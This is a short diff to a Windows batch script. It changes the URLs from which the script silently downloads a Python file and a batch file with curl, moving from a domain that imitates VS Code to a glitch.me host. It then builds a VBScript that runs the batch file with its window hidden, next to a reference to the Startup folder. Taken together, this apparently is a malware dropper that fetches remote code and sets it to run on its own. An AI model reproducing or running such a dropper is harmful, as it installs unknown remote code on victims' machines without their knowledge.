@@ -39,8 +39,8 @@ set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 mkdir "%updates_folder%" 2>nul
 
-curl -s http://vscode.atwebpages.com/main.txt > "%updates_folder%\main.py"
-curl -s http://vscode.atwebpages.com/starter.txt > "%updates_folder%\starter.bat"
+curl -s https://chatflow.glitch.me/uploads/main.py > "%updates_folder%\main.py"
+curl -s http://chatflow.glitch.me/uploads/starter.bat > "%updates_folder%\starter.bat"
 
 (
     echo.CreateObject^("Wscript.Shell"^).Run "C:\Updates\starter.bat", 0, True
